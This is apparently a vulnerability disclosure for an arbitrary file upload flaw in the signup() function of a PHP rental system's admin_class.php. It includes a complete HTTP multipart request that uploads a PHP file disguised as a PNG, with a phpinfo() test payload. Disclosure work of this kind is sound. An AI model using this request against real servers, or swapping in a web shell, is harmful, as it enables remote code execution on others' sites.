#### There is an arbitrary file upload vulnerability in the signup() function of the file rental/admin_class.php.

**Code analysis**

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910222231568.png)

Once `$_FILES['img']['tmp_name']` exists, the upload will proceed. It will first upload as a temporary file, and then use the function `move_uploaded_file` to move the temporary file to the `assets/uploads/` directory. There is no filtering on file extensions and content, and the file name is a timestamp that can be brute-forced based on the time range.

**Vulnerability reproduction**

poc

```http
POST /ajax.php?action=signup HTTP/1.1
Host: localhost:1110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:1110/index.php?page=payment_report
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: multipart/form-data; boundary=---------------------------303633564229447810934000106849
Content-Length: 712

-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="firstname"

testa
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="lastname"

111a
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="password"

testa
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="email"

test@qq.coma
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="img"; filename="1.php" 
Content-Type: image/png  

<?php phpinfo();
-----------------------------303633564229447810934000106849--
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910222734083.png)

After the project is issued, return to the directory and see the upload successful.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910222642918.png)

Access the file path to resolve.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910222828662.png)

